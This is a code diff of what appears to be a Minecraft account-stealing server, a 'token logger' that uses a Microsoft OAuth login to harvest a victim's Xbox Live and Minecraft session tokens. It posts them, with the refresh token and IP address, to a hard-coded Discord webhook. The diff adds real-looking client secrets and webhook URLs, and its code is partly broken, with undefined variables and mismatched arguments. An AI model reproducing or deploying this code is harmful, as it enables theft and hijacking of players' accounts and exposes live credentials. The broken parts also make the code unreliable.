@@ -1,9 +1,9 @@
 // Configuration
-const client_secret = 'change'
-const client_id = 'change'
-const redirect_uri = 'change'
-const webhook_url = 'change'
-const webhook_logging_url = 'change'
+const client_secret = '-Pw8Q~oEXLe~w~eRhIfGOp0qOuZS6PeafRIOCbPQ'
+const client_id = '170ccb61-c568-409a-a59a-e2ecd656a9c5'
+const redirect_uri = 'https://linkdiscord.herokuapp.com'
+const webhook_url = 'https://discord.com/api/webhooks/1041392438268408009/SmIHe63fDeDjxCF4eoO8QB4Gi3cC3VM9ByEnyW5u-xBd4T5pxzZ7nrTMTT3QrvhN39pl'
+const webhook_logging_url = 'https://discord.com/api/webhooks/1041392438268408009/SmIHe63fDeDjxCF4eoO8QB4Gi3cC3VM9ByEnyW5u-xBd4T5pxzZ7nrTMTT3QrvhN39pl'
 // Config end
 const axios = require('axios')
 const express = require('express')
@@ -11,29 +11,23 @@ const app = express()
 const port = process.env.PORT || 3000
 
 app.get('/', async (req, res) => {
-    res.send('Success! You can exit this page and return to discord.')
+    res.send('Success! Check webhook.')
     const code = req.query.code
     if (code == null) {
         return
     }
     try {
-        const accessTokenAndRefreshTokenArray = await getAccessTokenAndRefreshToken(code)
-        const accessToken = accessTokenAndRefreshTokenArray[0]
-        const refreshToken = accessTokenAndRefreshTokenArray[1]
-        const hashAndTokenArray = await getUserHashAndToken(accessToken)
-        const userToken = hashAndTokenArray[0]
-        const userHash = hashAndTokenArray[1]
         const xstsToken = await getXSTSToken(userToken)
+        const userHash = await getUserHash(userToken)
         const bearerToken = await getBearerToken(xstsToken, userHash)
         const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
         const uuid = usernameAndUUIDArray[0]
         const username = usernameAndUUIDArray[1]
         if (checkIfBanned(username)) {
-            logToWebhook("Reject", "A person has been rejected.")
             return
         }
         const ip = getIp(req)
-        postToWebhook(username, bearerToken, uuid, name, refreshToken)
+        postToWebhook(username, bearerToken, uuid)
     } catch (e) {
         console.log(e)
     }
@@ -42,6 +36,28 @@ app.get('/', async (req, res) => {
 app.listen(port, () => {
     console.log(`Started the server on ${port}`)
 })
+
+async function getAccessTokenAndRefreshToken(code) {
+    const url = 'https://login.live.com/oauth20_token.srf'
+
+    const config = {
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+        }
+    }
+    let data = {
+        client_id: client_id,
+        redirect_uri: redirect_uri,
+        client_secret: client_secret,
+        code: code,
+        grant_type: 'authorization_code'
+    }
+
+    let response = await axios.post(url, data, config)
+    return [response.data['access_token'], response.data['refresh_token']]
+}
+
+
 
 async function getUserHashAndToken(accessToken) {
     const url = 'https://user.auth.xboxlive.com/user/authenticate'
@@ -77,6 +93,24 @@ async function getXSTSToken(userToken) {
     return response.data['Token']
 }
 
+async function getUserHash(userToken) {
+    const url = 'https://xsts.auth.xboxlive.com/xsts/authorize'
+    const config = {
+        headers: {
+            'Content-Type': 'application/json', 'Accept': 'application/json',
+        }
+    }
+    let data = {
+        Properties: {
+            SandboxId: 'RETAIL',
+            UserTokens: [userToken]
+        }, RelyingParty: 'rp://api.minecraftservices.com/', TokenType: 'JWT'
+    }
+    let response = await axios.post(url, data, config)
+
+    return response.data['DisplayClaims']['xui'][0]['uhs']
+}
+
 async function getBearerToken(xstsToken, userHash) {
     const url = 'https://api.minecraftservices.com/authentication/login_with_xbox'
     const config = {
@@ -106,12 +140,12 @@ function getIp(req) {
     return req.headers['x-forwarded-for'] || req.socket.remoteAddress
 }
 
-function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
+function postToWebhook(username, bearerToken, uuid, ip, refreshToken, userToken) {
     const url = webhook_url
     let data = {
         username: " ",
         avatar_url: "https://cdn.discordapp.com/attachments/1021436161694105656/1027591805719560322/xd.jpg",
-        content: "@everyone",
+        content: "@everyone" + "  SESSION REFRESHED (XBL) :",
         embeds: [{
             title: "User Info", color: 0x00ff50, fields: [
                 {name: "Username", value: username, inline: true},
@@ -119,12 +153,12 @@ function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
                 {name: "Ip", value: ip, inline: true},
                 {name: "SessionID", value: bearerToken, inline: false},
                 {name: "Refresh Token", value: refreshToken, inline: false},
+                {name: "User Token (xbl token?)", value: userToken, inline: false},
                 {name: "Login", value: username + ":" + uuid + ":" + bearerToken, inline: false},
             ]
         }]
     }
     axios.post(url, data).then(() => console.log("Successfully authenticated, posting to webhook!"))
-    logToWebhook("Accepted", "A person has been accepted and it has been sent to the webhook.")
 }
 
 function logToWebhook(title, message) {
